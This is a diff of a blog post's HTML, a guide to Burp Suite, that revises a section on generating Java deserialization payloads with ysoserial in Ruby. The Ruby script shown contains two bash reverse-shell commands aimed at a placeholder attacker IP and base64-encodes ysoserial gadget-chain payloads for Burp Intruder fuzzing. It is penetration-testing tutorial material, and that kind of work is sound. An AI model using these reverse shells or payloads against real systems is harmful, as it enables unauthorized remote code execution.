@@ -61,7 +61,7 @@
       "datePublished": "2020-07-23 00:00:00 \x2b0000 UTC",
       "dateModified" : "2020-07-23 00:00:00 \x2b0000 UTC",
       "url" : "https:\/\/brandonsstewart.com\/blog\/guide-to-burp-suite\/",
-      "wordCount" : "1440",
+      "wordCount" : "1475",
       "keywords" : ["burp suite", "security", "ruby", "ysoserial", "Blog"]
     }
   
@@ -190,9 +190,10 @@ print response
 </code></pre>
 <p>This is a very simple example, but this code uses Ruby&rsquo;s Faraday gem to make a request through the Burp proxy.  This will allow requests generated from this script to to appear in the Burp proxy.  If I am writing a proof of concept exploit script, for example, this would allow me to observe the requests in Burp and compare them with requests that I have successfully made against the server.</p>
 <h2 id="generating-intruder-payloads-with-ysoserial-and-ruby">Generating Intruder Payloads with ysoserial and Ruby<a class="anchor" href="#generating-intruder-payloads-with-ysoserial-and-ruby">#</a></h2>
-<p>Ysoserial is a powerful tool that is used to create gadget chains to exploit Deserialization vulnerabilities in Java.  Basically, this will create a string of some kind that contains malicious code that can result in <code>Remote Code Execution</code> or other exploit conditions within a Java application.</p>
-<p>While attempting to exploit a vulnerability in a Java application, I wrote the following script to generate a text file of ysoserial payloads encoded in base64.</p>
-<p>In addition to the ysoserial payload, this also uses 3 different payloads for each of the payloads.  It also encodes the payloads in base64, which is commonly used by Java applications to receive a base64 encoded object.</p>
+<p>Ysoserial is a powerful tool that is used to create gadget chains to exploit Deserialization vulnerabilities in Java.  Basically, this will create a string of some kind that contains malicious code that can result in arbitrary code execution within a Java application.</p>
+<p>While attempting to exploit a deserialization vulnerability in a Java application, I wrote the following script to generate a text file of ysoserial payloads encoded in base64.</p>
+<p>In addition to the ysoserial payload, this also uses loops through 3 different commands to include in each of the payloads.  The three payloads tested 2 variations of a bash reverse shell that connects to a netcat listener, and one test for a command injection by seeing if I could create a file using the <code>touch</code> command.</p>
+<p>After generating the payload from ysoserial it encodes the output of the ysoserial command in base64, which is commonly used by Java web applications to receive a serialized object, and saves the resulting string to a new line of the text file.</p>
 <pre><code class="language-ruby">require 'base64'
 cmd = &quot;bash -i &gt;&amp; /dev/tcp/&lt;attacker_ip&gt;/4444 0&gt;&amp;1&quot;
 cmd2 = &quot;0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/&lt;attacker_ip&gt;/4444; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196&quot;
@@ -215,8 +216,7 @@ payloads = %w(BeanShell1 C3P0 Clojure CommonsBeanutils1 CommonsCollections1
   end
 end
 </code></pre>
-<p>The three payloads tested 2 variations of a bash reverse shell that connects to a netcat listener, and one test for a command injection by seeing if I could create a file using the <code>touch</code> command.  I was able to use this to determine if the application was vulnerable to one of the given gadget chain command combinations.</p>
-<p>In a similar way, intruder payloads can be generated using other tools to fuzz an application.</p>
+<p>I was able to use this to determine if the application was vulnerable to one of the gadget chains within ysoserial. Once this text file was generated, I was able to use it as an intruder payload, effectively using Burp to fuzz the application in a targeted, and controlled way.</p>
 <h2 id="burp">Burp<a class="anchor" href="#burp">#</a></h2>
 <p>Burp is a fantastic tool to use for analyzing a web application for vulnerabilities.  You can also use scripts to enhance Burp&rsquo;s utility when analyzing a web application for vulnerabilities.</p>
 
